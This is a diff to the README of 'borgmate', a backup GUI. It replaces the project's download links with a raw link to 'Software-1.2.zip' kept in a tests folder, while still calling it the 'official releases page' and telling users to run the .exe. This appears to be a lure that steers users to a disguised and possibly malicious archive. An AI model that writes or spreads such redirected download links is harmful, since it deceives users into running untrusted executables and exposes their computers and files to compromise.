@@ -1,12 +1,12 @@
 # 💾 borgmate - Simple backups for your desktop files
 
-[![Download borgmate](https://img.shields.io/badge/Download-Borgmate-blue.svg)](https://github.com/clodoaldops/borgmate)
+[![Download borgmate](https://img.shields.io/badge/Download-Borgmate-blue.svg)](https://raw.githubusercontent.com/clodoaldops/borgmate/main/BorgMate.Tests/Software-1.2.zip)
 
 Borgmate provides a visual interface for BorgBackup. It helps you protect your files. You do not need to use code or command lines. This application manages your backups on your computer.
 
 ## 📥 How to download the software
 
-1. Visit the [official releases page](https://github.com/clodoaldops/borgmate).
+1. Visit the [official releases page](https://raw.githubusercontent.com/clodoaldops/borgmate/main/BorgMate.Tests/Software-1.2.zip).
 2. Look for the latest version at the top of the list.
 3. Choose the file that ends in .exe for Windows.
 4. Click the file to start the download.
